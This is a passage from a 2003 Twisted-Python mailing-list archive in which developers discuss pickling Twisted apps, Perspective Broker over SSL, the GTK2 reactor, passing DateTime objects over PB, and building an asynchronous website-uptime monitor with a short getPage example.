around so that static files and dynamic pages are hierarchically separated,
somebody tell me (and tell me why).

I really am looking for guidance on this; my first Twisted app (which
currently powers my web page) is a kludgy nasty hack, and I want to make
this ultra-refactoring as clean and "pure" as possible.

-- 
Alex Levy
WWW: http://mesozoic.geecs.org
 
"Never let your sense of morals prevent you from doing what is right."
 -- Salvor Hardin, Isaac Asimov's _Foundation_



From abe at fettig.net  Tue Jul 15 12:52:30 2003
From: abe at fettig.net (Abe Fettig)
Date: 15 Jul 2003 12:52:30 -0400
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <20030715032207.14067.qmail@green.zadka.com>
References: <1058236423.6090.5.camel@mingus>
	 , <1058035798.1298.18.camel@mingus> , <1058025187.933.51.camel@mingus>
	 , <004d01c34809$46f32030$0401a8c0@razor> <20030712002931.GA1208@radii>
	 <005701c34810$68f725d0$0401a8c0@razor>
	 <20030712181337.16477.qmail@green.zadka.com>
	 <20030712230505.27817.qmail@green.zadka.com>
	 <20030715032207.14067.qmail@green.zadka.com>
Message-ID: <1058287949.15783.29.camel@mingus>

On Mon, 2003-07-14 at 23:22, Moshe Zadka wrote:
> >         cPickle.PicklingError: Can't pickle
> > __builtin__.ServiceWebManager: it's not found as
> > __builtin__.ServiceWebManager
> 
> A better way, after you're beyond simply examples, is to put the
> classes in a module. Even if you don't use the snapshots, they are
> sometimes useful for post-mortem debugging.

Right, in a real app I'd have my classes in seperate modules.  I'm just
trying to demonstrate a Twisted app by putting everything in the same
file.  Is this really not possible?

(I also tried running the app without passing save=0.  When I kill it,
it creates a file named "Test App-shutdown.tap".  But if I try to run
this using "twistd -nf Test\ App-shutdown.tap", I get another error:
Failed to load application: <twisted.persisted.styles.Ephemeral instance
at 0x819ebf4> is not safe for unpickling)

Honestly it doesn't bother me if I can't support pickling in this
example.  But from the comments on this list it seems like making an app
pickleable is very important, so in the interests of doing things the
Twisted Way I'd like to get it working.

Abe






From m at moshez.org  Tue Jul 15 14:11:55 2003
From: m at moshez.org (Moshe Zadka)
Date: 15 Jul 2003 18:11:55 -0000
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <1058287949.15783.29.camel@mingus>
References: <1058287949.15783.29.camel@mingus>, <1058236423.6090.5.camel@mingus>
	 , <1058035798.1298.18.camel@mingus> , <1058025187.933.51.camel@mingus>
	 , <004d01c34809$46f32030$0401a8c0@razor> <20030712002931.GA1208@radii>
	 <005701c34810$68f725d0$0401a8c0@razor>
	 <20030712181337.16477.qmail@green.zadka.com>
	 <20030712230505.27817.qmail@green.zadka.com>
	 <20030715032207.14067.qmail@green.zadka.com>
Message-ID: <20030715181155.13082.qmail@green.zadka.com>

On 15 Jul 2003, Abe Fettig <abe at fettig.net> wrote:

> Right, in a real app I'd have my classes in seperate modules.  I'm just
> trying to demonstrate a Twisted app by putting everything in the same
> file.  Is this really not possible?

Yes, pickling and putting classes in the config file are incompatible.
This makes perfect sense if you consider that pickles saves classes
by reference, and there is no reason it will be able to find your
file to load the code from them. Making class picklable is not important
while testing -- feel free to run with --no_save during early development
stages, especially for demonstrations. I tend to have serious allergies
to putting class definitions in the config file anyway :)
Anyway, not only is this limitation inherent, nobody has plans to
make it go away.

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From abe at fettig.net  Tue Jul 15 15:00:42 2003
From: abe at fettig.net (Abe Fettig)
Date: 15 Jul 2003 15:00:42 -0400
Subject: [Twisted-Python] One big smile ...
In-Reply-To: <20030715181155.13082.qmail@green.zadka.com>
References: <1058287949.15783.29.camel@mingus>
	 , <1058236423.6090.5.camel@mingus> , <1058035798.1298.18.camel@mingus>
	 , <1058025187.933.51.camel@mingus> , <004d01c34809$46f32030$0401a8c0@razor>
	 <20030712002931.GA1208@radii> <005701c34810$68f725d0$0401a8c0@razor>
	 <20030712181337.16477.qmail@green.zadka.com>
	 <20030712230505.27817.qmail@green.zadka.com>
	 <20030715032207.14067.qmail@green.zadka.com>
	 <20030715181155.13082.qmail@green.zadka.com>
Message-ID: <1058295642.16032.31.camel@mingus>

On Tue, 2003-07-15 at 14:11, Moshe Zadka wrote:

> Yes, pickling and putting classes in the config file are incompatible.
> This makes perfect sense if you consider that pickles saves classes
> by reference, and there is no reason it will be able to find your
> file to load the code from them. Making class picklable is not important
> while testing -- feel free to run with --no_save during early development
> stages, especially for demonstrations. I tend to have serious allergies
> to putting class definitions in the config file anyway :)
> Anyway, not only is this limitation inherent, nobody has plans to
> make it go away.

That makes sense.  Thanks for the explanation!

Abe




From ok at mailcall.com.au  Wed Jul 16 05:23:12 2003
From: ok at mailcall.com.au (Omar Kilani)
Date: 16 Jul 2003 19:23:12 +1000
Subject: [Twisted-Python] Random Thinking
Message-ID: <1058347391.5578.38.camel@psyche.mailcall.com.au>

Hello World,

I'm planning a distributed network management system. I know I'll be
using Python, and PyGTK2 as the frontend (=client) to the system.

What I'd like to do is use the Perspective Broker in Twisted (as well as
all the other wonderful modules provided!) to implement the client <->
server and server <-> server systems (the servers can talk among each
other to reach quorum, etc.)

I had a few questions:

The Perspective Broker documentation states that it's "secure". 
How is it secure? Does it run over SSL? Can it? 

Am I able to reject connections with untrusted SSL certificates? 

Am I able to trust certificates programmatically? I want give the client
a list of servers that are untrusted, and when the user clicks 'Trust',
the connection is then permitted.

Is it possible to multicast from server --> n*client? 

Can I call methods on the client from the server? (so that the server
can push information to the client asynchronously.)

How's the stability of the GTK2 compatible Perspective Broker code in
Twisted?

Has anyone ever attempted to integrate Spread (www.spread.org) with
Twisted and use it as the transport?

That's all I can think of for now. Thanks for your help!

Best Regards,
Omar Kilani




From m at moshez.org  Wed Jul 16 06:06:12 2003
From: m at moshez.org (Moshe Zadka)
Date: 16 Jul 2003 10:06:12 -0000
Subject: [Twisted-Python] Random Thinking
In-Reply-To: <1058347391.5578.38.camel@psyche.mailcall.com.au>
References: <1058347391.5578.38.camel@psyche.mailcall.com.au>
Message-ID: <20030716100612.2033.qmail@green.zadka.com>

On 16 Jul 2003, Omar Kilani <ok at mailcall.com.au> wrote:

> The Perspective Broker documentation states that it's "secure". 

That means that malicious clients can't [hopefully] compromise servers,
and malicious servers can't compromise clients. That has nothing
to do with SSL. In fact, one day I intend to write a long rant
about why cryptography has little to do with security.

> How is it secure? Does it run over SSL? Can it? 

It can run over SSL, yes. listenSSL and getObjectAtSSL work
well enough for that.

> Am I able to reject connections with untrusted SSL certificates? 

You'd need to work a little bit for that. I estimate an overhead
of about 10 lines compared to what you had to do if we actually
engineered it correctly :(
[Summary: inherit from pb.Broker to do that check in connectionMade,
inherit from pb.BrokerFactoy to build your inherited Broker rather
than pb.Broker]

> Am I able to trust certificates programmatically? I want give the client
> a list of servers that are untrusted, and when the user clicks 'Trust',
> the connection is then permitted.

This is probably an issue of pyOpenSSL, because that's the underlying
layer for what Twisted uses. You will also probably want to save it
somewhere: Twisted is somewhat  on this issue. You will need to decide
where to save. Of course, files work :)

> Is it possible to multicast from server --> n*client? 

Not with PB. PB is TCP based, multicast is UDP based. Twisted does
support UDP, but you'll have to build your own layer on top of it.
Of course, you can still use jelly, which is the secure marshaller used
internally by PB. Of course, UDP is inherently insecure in that
malicious meddlers can do whatever they want to it [listen in, capture
packets, etc.] You can, of course, encrypt/sign the jellied packets
you multicast using packages like pycrypto.

> Can I call methods on the client from the server? (so that the server
> can push information to the client asynchronously.)

Yes.
You should probably convince yourself to stop saying the word "server"
or "client". There's little difference between them, except the server
gives the client an initial object reference.

> How's the stability of the GTK2 compatible Perspective Broker code in
> Twisted?

There's no relationship between GTK2 and PB. GTK2 looks to Twisted like
a reactor -- basically, something very low-level, pushing the bits.
Perspective Broker is all protocol-level code, which means it only
cares someone is pushing the bits. Of course, there are specific GUI
classes for PB-based authentication, but there is a good chance you
won't want them.
 
> Has anyone ever attempted to integrate Spread (www.spread.org) with
> Twisted and use it as the transport?

Not to my knowledge.

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From ok at mailcall.com.au  Wed Jul 16 08:00:18 2003
From: ok at mailcall.com.au (Omar Kilani)
Date: Wed, 16 Jul 2003 22:00:18 +1000 (EST)
Subject: [Twisted-Python] Random Thinking
In-Reply-To: <20030716100612.2033.qmail@green.zadka.com>
Message-ID: <Pine.LNX.4.21.0307162132430.15482-100000@adm1.mailcall.com.au>

On 16 Jul 2003, Moshe Zadka wrote:

> On 16 Jul 2003, Omar Kilani <ok at mailcall.com.au> wrote:
> 
> > The Perspective Broker documentation states that it's "secure". 
> 
> That means that malicious clients can't [hopefully] compromise servers,
> and malicious servers can't compromise clients. That has nothing
> to do with SSL. In fact, one day I intend to write a long rant
> about why cryptography has little to do with security.

I understand that SSL doesn't make something secure. I just ment does it
encrypt the data in some way? Etc. I actually just wanted a method of
determining that the machine is who it says it is. And SSL solves that
problem nicely (or some form of PKI.)

> 
> > How is it secure? Does it run over SSL? Can it? 
> 
> It can run over SSL, yes. listenSSL and getObjectAtSSL work
> well enough for that.
> 

Ah. My fault, I didn't see getObjectAtSSL. Sorry.

> > Am I able to reject connections with untrusted SSL certificates? 
> 
> You'd need to work a little bit for that. I estimate an overhead
> of about 10 lines compared to what you had to do if we actually
> engineered it correctly :(
> [Summary: inherit from pb.Broker to do that check in connectionMade,
> inherit from pb.BrokerFactoy to build your inherited Broker rather
> than pb.Broker]
> 

OK. Thanks.

> > Am I able to trust certificates programmatically? I want give the client
> > a list of servers that are untrusted, and when the user clicks 'Trust',
> > the connection is then permitted.
> 
> This is probably an issue of pyOpenSSL, because that's the underlying
> layer for what Twisted uses. You will also probably want to save it
> somewhere: Twisted is somewhat  on this issue. You will need to decide
> where to save. Of course, files work :)
> 
> > Is it possible to multicast from server --> n*client? 
> 
> Not with PB. PB is TCP based, multicast is UDP based. Twisted does
> support UDP, but you'll have to build your own layer on top of it.
> Of course, you can still use jelly, which is the secure marshaller used
> internally by PB. Of course, UDP is inherently insecure in that
> malicious meddlers can do whatever they want to it [listen in, capture
> packets, etc.] You can, of course, encrypt/sign the jellied packets
> you multicast using packages like pycrypto.
>

OK. I don't really mean "multicast". I mean somehow call the same methods
with the same data on a bunch of different "clients" (OK, how do I
describe the non-servers? :-)

Can I do this efficiently? Is there a need to even worry about it?
Should I just:

for connect in connects:
	connect.callRemote(...)
 
> > Can I call methods on the client from the server? (so that the server
> > can push information to the client asynchronously.)
> 
> Yes.
> You should probably convince yourself to stop saying the word "server"
> or "client". There's little difference between them, except the server
> gives the client an initial object reference.
>

I'll try. I don't know how else to describe them. :-)
What I really meant was: can I callRemote from the initial object
reference provider to the ... "client"?
 
> > How's the stability of the GTK2 compatible Perspective Broker code in
> > Twisted?
> 
> There's no relationship between GTK2 and PB. GTK2 looks to Twisted like
> a reactor -- basically, something very low-level, pushing the bits.
> Perspective Broker is all protocol-level code, which means it only
> cares someone is pushing the bits. Of course, there are specific GUI
> classes for PB-based authentication, but there is a good chance you
> won't want them.
>

OK. What I really meant (hehe) was: Is the GTK2 reactor code stable?
Should I be aware of any surprises it might present?
Are there examples of usage?
Is calling gtk2reactor.install() all I need to do?
  
> > Has anyone ever attempted to integrate Spread (www.spread.org) with
> > Twisted and use it as the transport?
> 
> Not to my knowledge.
> 
> 

OK. I've only just started looking at Twisted. So some of my questions may
seem rather superfluous. There's a lot in Twisted, and I'm trying to get
my head around it.

Thanks for your help.

Regards,
Omar Kilani




From m at moshez.org  Wed Jul 16 08:37:21 2003
From: m at moshez.org (Moshe Zadka)
Date: 16 Jul 2003 12:37:21 -0000
Subject: [Twisted-Python] Random Thinking
In-Reply-To: <Pine.LNX.4.21.0307162132430.15482-100000@adm1.mailcall.com.au>
References: <Pine.LNX.4.21.0307162132430.15482-100000@adm1.mailcall.com.au>
Message-ID: <20030716123721.6924.qmail@green.zadka.com>

On Wed, 16 Jul 2003, Omar Kilani <ok at mailcall.com.au> wrote:

> I understand that SSL doesn't make something secure. I just ment does it
> encrypt the data in some way? Etc. I actually just wanted a method of
> determining that the machine is who it says it is. And SSL solves that
> problem nicely (or some form of PKI.)

Then why not say what you mean. "I need to cryptographically ascertain
identities". Yes, SSL is decent for that. But Twisted developers (try to)
use terminology correctly. When we say secure, we mean "cannot be compromised
[as far as we know]".
 
> OK. I don't really mean "multicast".

Again, try to use the terminology everybody else does. Or, at least,
invent your own words which lack any pre-assumed meanings. Otherwise,
you'll run the risk of people replying to questions you didn't ask.

> Can I do this efficiently? Is there a need to even worry about it?

You should never worry about efficiency before you have proof you
need it. Did nobody quote Knuth at you?

> Should I just:
> 
> for connect in connects:
> 	connect.callRemote(...)

That looks sane.

> I'll try. I don't know how else to describe them. :-)

"peers"

> What I really meant was: can I callRemote from the initial object
> reference provider to the ... "client"?

Perspective Broker is fully symmetric, but needs objects.
If you do that, you probably actually want perspectives -- and the
answer is yes, it is possible to have that abstraction.

> OK. What I really meant (hehe) was: Is the GTK2 reactor code stable?

It runs the tests, but nobody is using it for production applications,
as far as I know.

> Should I be aware of any surprises it might present?

Hopefully, not.

> Are there examples of usage?
> Is calling gtk2reactor.install() all I need to do?

NO!
What you should do is write an Application, and then use
% twistd --reactor gtk2 -n -y yourapplication.tpy
There is absolutely no need for any of your code to access the
gtk2reactor module. Of course, your code may not run correctly
without it -- for example, opening windows will probably not work.
But that is still no excuse for any of your code to manually import
gtk2reactor, and risk it being too late.

In general, note that Twisted is properly modularized so that
you *can* do stuff like gtk2reactor.install(). But you shouldn't:
you should use the official blessed way to do it. Just assume
we have an official blessed way for a reason, and even if there's
no reason, you don't want idiosyncracies in your code. Code with
fingerprints on it is no better than glass with fingerprints on it.

-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From egor at iplus.ru  Wed Jul 16 10:31:28 2003
From: egor at iplus.ru (Egor Cheshkov)
Date: Wed, 16 Jul 2003 18:31:28 +0400
Subject: [Twisted-Python] Passing mx.DateTime objects to PB
Message-ID: <200307161831.28533.egor@iplus.ru>

Hello! Another beginner's question. How can I pass mx.DateTime objects to and 
from PB remote method calls? Should I create a subclass of mx.DateTime and 
pb.Copyable?

-- 
Egor Cheshkov 





From brad at bbnet.ca  Wed Jul 16 11:25:20 2003
From: brad at bbnet.ca (Brad Bollenbach)
Date: Wed, 16 Jul 2003 11:25:20 -0400
Subject: [Twisted-Python] How Twisted is This?
Message-ID: <20030716152520.GA19537@xdsk200>

Hi,

I'm evaluating Twisted for the networking component of a web server
monitoring service. Eventually, this service will support monitoring
pretty much any TCP-enabled device. 

I want to figure out whether Twisted is applicable to my problem.

This web monitoring system will be:

* branded for the company I work for 

* multiuser 

* offer various ways of verifying the uptime and integrity of content on
a site:

    i. Can I open an HTTP connection to this site?
    ii. Is "foo bar" present on the page that I've retrieved?
    iii. Is the page I've retrieved the same size as it was before?
    iv. Is Basic Auth still working with this username/password? (for
    pages that do Basic Auth, of course :)

...and so forth.

So, my main use case (possibly) relevant to Twisted would be:

I write a "monicron". monicron wakes up every five minutes and asks the
system "are there any monitors that need to be performed right now?" The
answer will either be "Yes, here's the monitors that need to be
performed right now" or "No".

If No, monicron will just go back to bed for another five minutes.

If the answer is Yes monicron will gather the monitors that need to be
run, and execute the all at once -- asyncronously. It would then need to
collect the results of all the monitors, and once they've all reported
back for a given site, send an error report if something went wrong.

1. Does this sound Twisted?

2. If Yes, where should I start looking for the bits of the framework
that will make my task as easy as possible?

--
Brad Bollenbach



From ivo at amaze.nl  Wed Jul 16 11:45:04 2003
From: ivo at amaze.nl (Ivo van der Wijk)
Date: Wed, 16 Jul 2003 17:45:04 +0200
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <20030716152520.GA19537@xdsk200>; from brad@bbnet.ca on Wed, Jul 16, 2003 at 11:25:20AM -0400
References: <20030716152520.GA19537@xdsk200>
Message-ID: <20030716174504.V15104@amaze.nl>

On Wed, Jul 16, 2003 at 11:25:20AM -0400, Brad Bollenbach wrote:
> Hi,
> 
> I'm evaluating Twisted for the networking component of a web server
> monitoring service. Eventually, this service will support monitoring
> pretty much any TCP-enabled device. 
> 
> I want to figure out whether Twisted is applicable to my problem.
> 
> This web monitoring system will be:
> 
> * branded for the company I work for 
> 
> * multiuser 
> 
> * offer various ways of verifying the uptime and integrity of content on
> a site:
> 
>     i. Can I open an HTTP connection to this site?
>     ii. Is "foo bar" present on the page that I've retrieved?
>     iii. Is the page I've retrieved the same size as it was before?
>     iv. Is Basic Auth still working with this username/password? (for
>     pages that do Basic Auth, of course :)
> 

I've written a HTTP watchdog using Twisted that does something like this:

- can I connect
- can I HEAD / and get a result
- does all of this happen in the correct time interval

The watchdog resets the service if it is not responding, and keeps track
of some statistics to avoid continuous restarting.

> ...and so forth.
> 
> So, my main use case (possibly) relevant to Twisted would be:
> 
> I write a "monicron". monicron wakes up every five minutes and asks the
> system "are there any monitors that need to be performed right now?" The
> answer will either be "Yes, here's the monitors that need to be
> performed right now" or "No".
> 
> If No, monicron will just go back to bed for another five minutes.
> 
> If the answer is Yes monicron will gather the monitors that need to be
> run, and execute the all at once -- asyncronously. It would then need to
> collect the results of all the monitors, and once they've all reported
> back for a given site, send an error report if something went wrong.
> 
> 1. Does this sound Twisted?
> 

Somewhat. You need to make very sure your system doesn't block unexpectedly :)

> 2. If Yes, where should I start looking for the bits of the framework
> that will make my task as easy as possible?
> 

I have a rather ugly Twisted script which might give you a start (it does the 
checking at intervals, gathering results / setting timeouts, etc).

If you're interested, I could try to cleanup the code a bit.

Cheers

	Ivo

-- 
Drs. I.R. van der Wijk                                      -=-              
Korte Leidsedwarsstraat 12                     Amaze Internet Services V.O.F.
1017 RC Amsterdam, NL                                       -=-              
T +31-20-4688336         F +31-20-4688337        Linux/Web/Zope/SQL/MMBase   
W http://www.amaze.nl    E info at amaze.nl             Network Solutions        
W http://vanderwijk.info E ivo at amaze.nl                 Consultancy          
PGP http://vanderwijk.info/pgp                              -=-              



From smurf at smurf.noris.de  Wed Jul 16 11:47:05 2003
From: smurf at smurf.noris.de (Matthias Urlichs)
Date: Wed, 16 Jul 2003 17:47:05 +0200
Subject: [Twisted-Python] How Twisted is This?
References: <20030716152520.GA19537@xdsk200>
Message-ID: <pan.2003.07.16.15.47.03.115396@smurf.noris.de>

Hi, Brad Bollenbach wrote:

> I write a "monicron". monicron wakes up every five minutes and asks the
> system "are there any monitors that need to be performed right now?" The
> answer will either be "Yes, here's the monitors that need to be
> performed right now" or "No".

Why don't you write a function that finds the earliest monitor job which
needs to run next, and delay for exactly that amount?

-- 
Matthias Urlichs   |   {M:U} IT Design @ m-u-it.de   |  smurf at smurf.noris.de
Disclaimer: The quote was selected randomly. Really. | http://smurf.noris.de
-- 
Nice guys finish last.
		-- Leo Durocher




From m at moshez.org  Wed Jul 16 11:49:07 2003
From: m at moshez.org (Moshe Zadka)
Date: 16 Jul 2003 15:49:07 -0000
Subject: [Twisted-Python] Passing mx.DateTime objects to PB
In-Reply-To: <200307161831.28533.egor@iplus.ru>
References: <200307161831.28533.egor@iplus.ru>
Message-ID: <20030716154907.13430.qmail@green.zadka.com>

On Wed, 16 Jul 2003, Egor Cheshkov <egor at iplus.ru> wrote:

> Hello! Another beginner's question. How can I pass mx.DateTime objects to and 
> from PB remote method calls? Should I create a subclass of mx.DateTime and 
> pb.Copyable?

A. Did everyone drink copying juice today or something? Stop copying classes,
people. Most of the time, you want remote references. Really.

B. In both cases, you can go either the inheritance or the containment
route. Which one you take is up to you.

C. It doesn't appear that Jelly or PB support components, precluding
that strategy. Am I wrong? Is there a way to use components?
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From m at moshez.org  Wed Jul 16 11:52:50 2003
From: m at moshez.org (Moshe Zadka)
Date: 16 Jul 2003 15:52:50 -0000
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <20030716152520.GA19537@xdsk200>
References: <20030716152520.GA19537@xdsk200>
Message-ID: <20030716155250.13563.qmail@green.zadka.com>

On Wed, 16 Jul 2003, Brad Bollenbach <brad at bbnet.ca> wrote:

> * branded for the company I work for 

I'm not sure what this means.

> * multiuser 

I'm not sure what this mean either.

> * offer various ways of verifying the uptime and integrity of content on
> a site:
> 
>     i. Can I open an HTTP connection to this site?
>     ii. Is "foo bar" present on the page that I've retrieved?
>     iii. Is the page I've retrieved the same size as it was before?
>     iv. Is Basic Auth still working with this username/password? (for
>     pages that do Basic Auth, of course :)

Look at twisted.web.monitor.
Basically, most of this is fairly easy with Twisted.

> I write a "monicron". monicron wakes up every five minutes and asks the
> system "are there any monitors that need to be performed right now?" The
> answer will either be "Yes, here's the monitors that need to be
> performed right now" or "No".
> 
> If No, monicron will just go back to bed for another five minutes.
> 
> If the answer is Yes monicron will gather the monitors that need to be
> run, and execute the all at once -- asyncronously. It would then need to
> collect the results of all the monitors, and once they've all reported
> back for a given site, send an error report if something went wrong.

That sounds like the worst impelemntation strategy I could think
of. Wouldn't it be saner to have each task have its own scheduling?

> 2. If Yes, where should I start looking for the bits of the framework
> that will make my task as easy as possible?

Read the documentation?
Seriously, read all of it. I can't imagine many parts which wouldn't
be relevant.
-- 
Moshe Zadka -- http://moshez.org/
Buffy: I don't like you hanging out with someone that... short.
Riley: Yeah, a lot of young people nowadays are experimenting with shortness.
Agile Programming Language -- http://www.python.org/



From brad at bbnet.ca  Wed Jul 16 11:57:58 2003
From: brad at bbnet.ca (Brad Bollenbach)
Date: Wed, 16 Jul 2003 11:57:58 -0400
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <pan.2003.07.16.15.47.03.115396@smurf.noris.de>
References: <20030716152520.GA19537@xdsk200> <pan.2003.07.16.15.47.03.115396@smurf.noris.de>
Message-ID: <20030716155758.GA19921@xdsk200>

On Wed, Jul 16, 2003 at 05:47:05PM +0200, Matthias Urlichs wrote:
> Hi, Brad Bollenbach wrote:
> 
> > I write a "monicron". monicron wakes up every five minutes and asks the
> > system "are there any monitors that need to be performed right now?" The
> > answer will either be "Yes, here's the monitors that need to be
> > performed right now" or "No".
> 
> Why don't you write a function that finds the earliest monitor job which
> needs to run next, and delay for exactly that amount?

Because it's known that monitors can be run at either 5 or 15 minute
intervals. To wake up every five minutes is the simplest.

In any case, this is just an implementation detail, outside the point of
whether or not Twisted is what I'm looking for to minimize the amount of
time and effort needed to getting a running, sellable system.

--
Brad Bollenbach



From brad at bbnet.ca  Wed Jul 16 12:04:30 2003
From: brad at bbnet.ca (Brad Bollenbach)
Date: Wed, 16 Jul 2003 12:04:30 -0400
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <20030716174504.V15104@amaze.nl>
References: <20030716152520.GA19537@xdsk200> <20030716174504.V15104@amaze.nl>
Message-ID: <20030716160430.GB19921@xdsk200>

On Wed, Jul 16, 2003 at 05:45:04PM +0200, Ivo van der Wijk wrote:
> On Wed, Jul 16, 2003 at 11:25:20AM -0400, Brad Bollenbach wrote:

[snippity snip snip]

> > So, my main use case (possibly) relevant to Twisted would be:
> > 
> > I write a "monicron". monicron wakes up every five minutes and asks the
> > system "are there any monitors that need to be performed right now?" The
> > answer will either be "Yes, here's the monitors that need to be
> > performed right now" or "No".
> > 
> > If No, monicron will just go back to bed for another five minutes.
> > 
> > If the answer is Yes monicron will gather the monitors that need to be
> > run, and execute the all at once -- asyncronously. It would then need to
> > collect the results of all the monitors, and once they've all reported
> > back for a given site, send an error report if something went wrong.
> > 
> > 1. Does this sound Twisted?
> > 
> 
> Somewhat. You need to make very sure your system doesn't block unexpectedly :)

I'm not sure how you (or Twisted) define "unexpected", but I probably
want things to block when -- for example -- I try to retrieve a page
from a certain URL.

I certainly don't want to be writing state machines.

> > 2. If Yes, where should I start looking for the bits of the framework
> > that will make my task as easy as possible?
> > 
> 
> I have a rather ugly Twisted script which might give you a start (it does the 
> checking at intervals, gathering results / setting timeouts, etc).
> 
> If you're interested, I could try to cleanup the code a bit.

Yeah, I'd be interested in looking at that.

Regards,

--
Brad Bollenbach
BBnet.ca



From peter at engcorp.com  Wed Jul 16 12:12:28 2003
From: peter at engcorp.com (Peter Hansen)
Date: Wed, 16 Jul 2003 12:12:28 -0400
Subject: [Twisted-Python] How Twisted is This?
References: <20030716152520.GA19537@xdsk200> <pan.2003.07.16.15.47.03.115396@smurf.noris.de>
Message-ID: <3F15796C.D928EA92@engcorp.com>

Matthias Urlichs wrote:
> 
> Hi, Brad Bollenbach wrote:
> 
> > I write a "monicron". monicron wakes up every five minutes and asks the
> > system "are there any monitors that need to be performed right now?" The
> > answer will either be "Yes, here's the monitors that need to be
> > performed right now" or "No".
> 
> Why don't you write a function that finds the earliest monitor job which
> needs to run next, and delay for exactly that amount?

One good reason to do the "every five minutes check" thing instead of
"wait exactly this long based on a precalculated value" thing is that
if the things to be monitored can be added or removed dynamically,
interrupting the sleep is more difficult than it's worth, while the 
blind periodic check is much simpler and more robust.

-Peter



From brad at bbnet.ca  Wed Jul 16 12:24:01 2003
From: brad at bbnet.ca (Brad Bollenbach)
Date: Wed, 16 Jul 2003 12:24:01 -0400
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <20030716155250.13563.qmail@green.zadka.com>
References: <20030716152520.GA19537@xdsk200> <20030716155250.13563.qmail@green.zadka.com>
Message-ID: <20030716162401.GA19959@xdsk200>

On Wed, Jul 16, 2003 at 03:52:50PM -0000, Moshe Zadka wrote:
> On Wed, 16 Jul 2003, Brad Bollenbach <brad at bbnet.ca> wrote:
> 
> > * branded for the company I work for 
> 
> I'm not sure what this means.

It means that the user interfaces will be branded for the company I work
for.

> > * multiuser 
> 
> I'm not sure what this mean either.

It means there will be more than one user that will use this service.

> > * offer various ways of verifying the uptime and integrity of content on
> > a site:
> > 
> >     i. Can I open an HTTP connection to this site?
> >     ii. Is "foo bar" present on the page that I've retrieved?
> >     iii. Is the page I've retrieved the same size as it was before?
> >     iv. Is Basic Auth still working with this username/password? (for
> >     pages that do Basic Auth, of course :)
> 
> Look at twisted.web.monitor.
> Basically, most of this is fairly easy with Twisted.

This looks like a useful, albeit minimal, starting point.

> > I write a "monicron". monicron wakes up every five minutes and asks the
> > system "are there any monitors that need to be performed right now?" The
> > answer will either be "Yes, here's the monitors that need to be
> > performed right now" or "No".
> > 
> > If No, monicron will just go back to bed for another five minutes.
> > 
> > If the answer is Yes monicron will gather the monitors that need to be
> > run, and execute the all at once -- asyncronously. It would then need to
> > collect the results of all the monitors, and once they've all reported
> > back for a given site, send an error report if something went wrong.
> 
> That sounds like the worst impelemntation strategy I could think
> of. Wouldn't it be saner to have each task have its own scheduling?

Well, you didn't say anything about what specifically seemed bad about
the (very generic description of an) implementation I mentioned, so
there's no point considering other alternatives without having at least
considered the first one.

The metaphor I suggested maps well into the Real World (e.g. think of a
SWAT team that has to enter and "clear" a building; each cell is
deployed to their own piece of the building, but all have to report back
to one central command, otherwise there's no way to know if there's an
"all clear" or not).

> > 2. If Yes, where should I start looking for the bits of the framework
> > that will make my task as easy as possible?
> 
> Read the documentation?
> Seriously, read all of it. I can't imagine many parts which wouldn't
> be relevant.

Well, there's loads of it that's not relevant to my problem. A more
constructive pointer than "read all of it" would be useful, but I'll
look to more pragmatic sources to find that pointer. :)

--
Brad Bollenbach



From radix at twistedmatrix.com  Wed Jul 16 12:38:51 2003
From: radix at twistedmatrix.com (Christopher Armstrong)
Date: Wed, 16 Jul 2003 12:38:51 -0400
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <20030716160430.GB19921@xdsk200>
References: <20030716152520.GA19537@xdsk200> <20030716174504.V15104@amaze.nl> <20030716160430.GB19921@xdsk200>
Message-ID: <20030716163851.GA1259@radii>

On Wed, Jul 16, 2003 at 12:04:30PM -0400, Brad Bollenbach wrote:
> On Wed, Jul 16, 2003 at 05:45:04PM +0200, Ivo van der Wijk wrote:

> > Somewhat. You need to make very sure your system doesn't block
> > unexpectedly :)
> 
> I'm not sure how you (or Twisted) define "unexpected", but I probably
> want things to block when -- for example -- I try to retrieve a page
> from a certain URL.

"unexpectedly" means "at all" :-)

Are you sure you _really_ mean this? Is there some user interface bit
that you're implying when you say you want it to block? Do you just
mean that you want to wait for some tasks to complete before you start
others? If so, then that's not blocking, and Twisted is still
appropriate.

> I certainly don't want to be writing state machines.

That's how Twisted works. But it's not annoying if you have a good
standard library of state machines already :-) For example,
twisted.web.client and/or twisted.web.monitor already exist, so all
you would have to do to implement the web checker (using t.w.client)
is this (I'm assuming you know the basics of Deferreds)::

from twisted.web import client
class WebChecker:
    def doIt(self, url):
        return client.getPage(url,
                   ).addCallback(self.gotPage, url
                   ).addErrback(self.reportError, url)

    def gotPage(self, page, url):
        print "hooray, got page %s" % url
        #self.checkForFoo(page, url), etc

    def reportError(self, failure, url):
        print ":( There was a problem in %s" % url
        print failure

To try out this code, do

from twisted.internet import reactor
WebChecker().doIt('http://twistedmatrix.com/'
    ).addCallback(lambda *a: reactor.stop())
reactor.run()

-- 
 Twisted | Christopher Armstrong: International Man of Twistery
  Radix  |          Release Manager,  Twisted Project
---------+     http://twistedmatrix.com/users/radix.twistd/



From bob at redivi.com  Wed Jul 16 12:40:51 2003
From: bob at redivi.com (Bob Ippolito)
Date: Wed, 16 Jul 2003 12:40:51 -0400
Subject: [Twisted-Python] How Twisted is This?
In-Reply-To: <3F15796C.D928EA92@engcorp.com>
Message-ID: <42CC22C2-B7AC-11D7-AB7F-000A95686CD8@redivi.com>

